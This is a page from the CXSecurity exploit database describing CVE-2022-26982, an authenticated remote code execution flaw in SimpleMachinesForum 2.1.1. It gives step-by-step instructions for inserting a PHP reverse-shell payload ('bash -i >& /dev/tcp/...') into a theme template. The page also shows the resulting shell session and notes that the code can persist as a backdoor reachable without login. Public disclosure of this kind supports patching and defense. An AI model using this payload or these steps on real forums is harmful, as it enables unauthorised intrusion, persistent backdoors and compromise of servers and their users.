---
title: Remote Code Execution in SimpleMachinesForum 2.1.1
url: https://cxsecurity.com/issue/WLB-2022110029
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-19
fetch_date: 2025-10-03T23:11:47.122120
---

# Remote Code Execution in SimpleMachinesForum 2.1.1

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Remote Code Execution in SimpleMachinesForum 2.1.1** **2022.11.18**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [Sarang Tumne](https://cxsecurity.com/author/Sarang%2BTumne/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-26982](https://cxsecurity.com/cveshow/CVE-2022-26982/ "Click to see CVE-2022-26982")**  CWE: **[CWE-732](https://cxsecurity.com/cwe/CWE-732 "CWE-732")**  **[**Dork:** SimpleMachinesForum Exploit](https://cxsecurity.com/dorks/)**  CVSS Base Score: **6.5/10**  Impact Subscore: **6.4/10**  Exploitability Subscore: **8/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **Single time**  Confidentiality impact: **Partial**  Integrity impact: **Partial**  Availability impact: **Partial** | |

# Exploit Title: Authenticated Remote Code Execution in SimpleMachinesForum 2.1.1
# Remote Code Execution in SimpleMachinesForum 2.1.1 and earlier allows remote attackers to execute arbitrary code via uploading a php web shell. SimpleMachinesForum 2.1.1 and earlier allows remote authenticated administrators to execute arbitrary code by inserting a vulnerable php code because the themes can be modified by an administrator.
# Exploit Author: Sarang Tumne @CyberInsane (Twitter: @thecyberinsane) #HTB profile: https://www.hackthebox.com/home/users/profile/2718
# Date: 7th March 2022
# CVE ID: CVE-2022-26982
# Confirmed on release 2.1.1
# Vendor: https://download.simplemachines.org/
# Note- Once we insert the vulnerable php code, we can even execute it without any valid login as it is not required! We can use it as a backdoor!
###############################################
#Step1- Login with Admin Credentials
#Step2- Goto Admin=>Main=>Administration Center=>Configuration=>Themes and Layout=>Modify Themes=>Browse the templates and files in this theme.=>Admin.template.php
#Step3- Now add the vulnerable php reverse tcp web shell exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/4477 0>&1'"); ?>
#Step4- Now Goto Add Media=>Add Resource=> Upload php web shell and click on SAVE CHANGES at the bottom of the page
#Step5- Now click on "Themes and Layout" and you will get the reverse shell:
E.g: Visit http://IP\_ADDR/index.php?action=admin;area=theme;b4c2510f=bc6cde24d794569356b81afc98ede2c2 and get the reverse shell:
listening on [any] 4477 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.130] 41276
bash: cannot set terminal process group (1334): Inappropriate ioctl for device
bash: no job control in this shell
daemon@debian:/opt/bitnami/simplemachinesforum$ whoami
whoami
daemon
daemon@debian:/opt/bitnami/simplemachinesforum$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@debian:/opt/bitnami/simplemachinesforum$

**##### References:**

https://github.com/sartlabs/0days/blob/main/SimpleMachinesForum/Exploit.txt

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110029)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top